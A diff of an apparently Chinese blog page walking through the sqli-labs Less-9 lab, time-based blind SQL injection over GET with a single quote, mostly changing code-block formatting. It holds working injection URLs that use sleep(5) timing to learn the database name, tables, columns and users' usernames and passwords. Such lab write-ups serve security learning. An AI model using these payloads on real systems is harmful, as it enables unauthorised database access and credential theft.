@@ -453,32 +453,42 @@ sleep(n)：命令延时 n 秒后执行
 <h2 id="注入步骤"><a href="#注入步骤" class="headerlink" title="注入步骤"></a>注入步骤</h2><h3 id="基于时间的GET单引号盲注"><a href="#基于时间的GET单引号盲注" class="headerlink" title="基于时间的GET单引号盲注"></a>基于时间的GET单引号盲注</h3><ol>
 <li><strong>输入字符使网页报错,判断执行的 SQL 语句</strong></li>
 </ol>
-<pre><code>http://192.168.150.128/sqli-labs-master/Less-9/?id=1'</code></pre><p><img src="https://i.loli.net/2019/10/16/JcXFtHx2eAzWS45.png" alt="less9-1.png"></p>
+<pre class="line-numbers language-bash"><code class="language-bash">http://192.168.150.128/sqli-labs-master/Less-9/?id<span class="token operator">=</span>1'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="https://i.loli.net/2019/10/16/JcXFtHx2eAzWS45.png" alt="less9-1.png"></p>
 <p>注：网页是正常界面，使用时间盲注进行测试</p>
 <ol start="2">
 <li><strong>判断数据库字符串的长度</strong></li>
 </ol>
-<pre><code>http://192.168.150.128/sqli-labs-master/Less-9/?id=1' and if(ascii(length(database()))&gt;56, 0, sleep(5))%23</code></pre><p><img src="https://i.loli.net/2019/10/16/5pRUJo36x1wNarc.png" alt="less9-2.png"></p>
-<pre><code>http://192.168.150.128/sqli-labs-master/Less-9/?id=1' and if(ascii(length(database()))=56, 0, sleep(5))%23</code></pre><p><img src="https://i.loli.net/2019/10/16/FZIXTMNaoPAYJj6.png" alt="less9-3.png"></p>
+<pre class="line-numbers language-bash"><code class="language-bash">http://192.168.150.128/sqli-labs-master/Less-9/?id<span class="token operator">=</span>1' and if<span class="token punctuation">(</span>ascii<span class="token punctuation">(</span>length<span class="token punctuation">(</span>database<span class="token punctuation">(</span><span class="token punctuation">))</span><span class="token punctuation">)</span><span class="token operator">&gt;</span>56, 0, sleep<span class="token punctuation">(</span>5<span class="token punctuation">))</span>%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="https://i.loli.net/2019/10/16/5pRUJo36x1wNarc.png" alt="less9-2.png"></p>
+<pre class="line-numbers language-bash"><code class="language-bash">http://192.168.150.128/sqli-labs-master/Less-9/?id<span class="token operator">=</span>1' and if<span class="token punctuation">(</span>ascii<span class="token punctuation">(</span>length<span class="token punctuation">(</span>database<span class="token punctuation">(</span><span class="token punctuation">))</span><span class="token punctuation">)</span><span class="token operator">=</span>56, 0, sleep<span class="token punctuation">(</span>5<span class="token punctuation">))</span>%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="https://i.loli.net/2019/10/16/FZIXTMNaoPAYJj6.png" alt="less9-3.png"></p>
 <ol start="3">
 <li><strong>判断数据库</strong></li>
 </ol>
-<pre><code>http://192.168.150.128/sqli-labs-master/Less-9/?id=1' and if(ascii(substr(database(),1,1))&gt;115, 0, sleep(5))%23</code></pre><p><img src="https://i.loli.net/2019/10/16/3GwjcbBpYnvPZH5.png" alt="less9-4.png"></p>
-<pre><code>http://192.168.150.128/sqli-labs-master/Less-9/?id=1' and if(ascii(substr(database(),1,1))=115, 0, sleep(5))%23</code></pre><p><img src="https://i.loli.net/2019/10/16/eonK3brJVg4LaXY.png" alt="less9-5.png"></p>
+<pre class="line-numbers language-bash"><code class="language-bash">http://192.168.150.128/sqli-labs-master/Less-9/?id<span class="token operator">=</span>1' and if<span class="token punctuation">(</span>ascii<span class="token punctuation">(</span>substr<span class="token punctuation">(</span>database<span class="token punctuation">(</span><span class="token punctuation">)</span>,1,1<span class="token punctuation">))</span><span class="token operator">&gt;</span>115, 0, sleep<span class="token punctuation">(</span>5<span class="token punctuation">))</span>%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="https://i.loli.net/2019/10/16/3GwjcbBpYnvPZH5.png" alt="less9-4.png"></p>
+<pre class="line-numbers language-bash"><code class="language-bash">http://192.168.150.128/sqli-labs-master/Less-9/?id<span class="token operator">=</span>1' and if<span class="token punctuation">(</span>ascii<span class="token punctuation">(</span>substr<span class="token punctuation">(</span>database<span class="token punctuation">(</span><span class="token punctuation">)</span>,1,1<span class="token punctuation">))</span><span class="token operator">=</span>115, 0, sleep<span class="token punctuation">(</span>5<span class="token punctuation">))</span>%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="https://i.loli.net/2019/10/16/eonK3brJVg4LaXY.png" alt="less9-5.png"></p>
 <ol start="4">
 <li><strong>判断表</strong></li>
 </ol>
-<pre><code>http://192.168.150.128/sqli-labs-master/Less-9/?id=1' and if(ascii(substr((select table_name from information_schema.tables where table_schema='security' limit 0,1),1,1))&gt;101, 0, sleep(5))%23</code></pre><p><img src="https://i.loli.net/2019/10/16/8jGMV7ZxhvKIFpz.png" alt="less9-6.png"></p>
-<pre><code>http://192.168.150.128/sqli-labs-master/Less-9/?id=1' and if(ascii(substr((select table_name from information_schema.tables where table_schema='security' limit 0,1),1,1))=101, 0, sleep(5))%23</code></pre><p><img src="https://i.loli.net/2019/10/16/9tTmR73w46gBbe2.png" alt="less9-7.png"></p>
+<pre class="line-numbers language-bash"><code class="language-bash">http://192.168.150.128/sqli-labs-master/Less-9/?id<span class="token operator">=</span>1<span class="token string">' and if(ascii(substr((select table_name from information_schema.tables where table_schema='</span>security' limit 0,1<span class="token punctuation">)</span>,1,1<span class="token punctuation">))</span><span class="token operator">&gt;</span>101, 0, sleep<span class="token punctuation">(</span>5<span class="token punctuation">))</span>%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="https://i.loli.net/2019/10/16/8jGMV7ZxhvKIFpz.png" alt="less9-6.png"></p>
+<pre class="line-numbers language-bash"><code class="language-bash">http://192.168.150.128/sqli-labs-master/Less-9/?id<span class="token operator">=</span>1<span class="token string">' and if(ascii(substr((select table_name from information_schema.tables where table_schema='</span>security' limit 0,1<span class="token punctuation">)</span>,1,1<span class="token punctuation">))</span><span class="token operator">=</span>101, 0, sleep<span class="token punctuation">(</span>5<span class="token punctuation">))</span>%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="https://i.loli.net/2019/10/16/9tTmR73w46gBbe2.png" alt="less9-7.png"></p>
 <ol start="5">
 <li><strong>判断字段</strong></li>
 </ol>
-<pre><code>http://192.168.150.128/sqli-labs-master/Less-9/?id=1' and if(ascii(substr((select column_name from information_schema.columns where table_schema='security' AND TABLE_NAME='users' limit 0,1),1,1))=68, 0, sleep(5))%23</code></pre><p><img src="https://i.loli.net/2019/10/16/4m5lzPZ81nhMNDB.png" alt="less9-8.png"></p>
+<pre class="line-numbers language-bash"><code class="language-bash">http://192.168.150.128/sqli-labs-master/Less-9/?id<span class="token operator">=</span>1<span class="token string">' and if(ascii(substr((select column_name from information_schema.columns where table_schema='</span>security<span class="token string">' AND TABLE_NAME='</span>users' limit 0,1<span class="token punctuation">)</span>,1,1<span class="token punctuation">))</span><span class="token operator">=</span>105, 0, sleep<span class="token punctuation">(</span>5<span class="token punctuation">))</span>%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="https://i.loli.net/2019/10/16/4m5lzPZ81nhMNDB.png" alt="less9-8.png"></p>
 <ol start="6">
 <li><strong>判断数据</strong></li>
 </ol>
-<pre><code>http://192.168.150.128/sqli-labs-master/Less-9/?id=1' and if(ascii(substr((select username FROM security.users limit 0,1),1,1))=68, 0, sleep(5))%23</code></pre><p><img src="https://i.loli.net/2019/10/16/DVzIYSaxdcOqB7p.png" alt="less9-9.png"></p>
-<pre><code>http://192.168.150.128/sqli-labs-master/Less-9/?id=1' and if(ascii(substr((select password FROM security.users limit 0,1),1,1))=68, 0, sleep(5))%23</code></pre><p><img src="https://i.loli.net/2019/10/16/6bsNqC2iOByda4k.png" alt="less9-10.png"></p>
+<pre class="line-numbers language-bash"><code class="language-bash">http://192.168.150.128/sqli-labs-master/Less-9/?id<span class="token operator">=</span>1' and if<span class="token punctuation">(</span>ascii<span class="token punctuation">(</span>substr<span class="token variable"><span class="token punctuation">((</span>select username FROM security.users limit <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">))</span></span><span class="token operator">=</span>68, 0, sleep<span class="token punctuation">(</span>5<span class="token punctuation">))</span>%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="https://i.loli.net/2019/10/16/DVzIYSaxdcOqB7p.png" alt="less9-9.png"></p>
+<pre class="line-numbers language-bash"><code class="language-bash">http://192.168.150.128/sqli-labs-master/Less-9/?id<span class="token operator">=</span>1' and if<span class="token punctuation">(</span>ascii<span class="token punctuation">(</span>substr<span class="token variable"><span class="token punctuation">((</span>select password FROM security.users limit <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">))</span></span><span class="token operator">=</span>68, 0, sleep<span class="token punctuation">(</span>5<span class="token punctuation">))</span>%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="https://i.loli.net/2019/10/16/6bsNqC2iOByda4k.png" alt="less9-10.png"></p>
 <h2 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h2><p><a href="https://www.cnblogs.com/omnis/p/8318743.html" target="_blank" rel="noopener">【sqli-labs】 less9 GET - Blind - Time based. - Single Quotes (基于时间的GET单引号盲注)</a></p>
 <script>
         document.querySelectorAll('.github-emoji')
@@ -744,7 +754,7 @@ sleep(n)：命令延时 n 秒后执行
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">27.7k</span>&nbsp;字
+                class="white-color">31.6k</span>&nbsp;字
                
             
 			
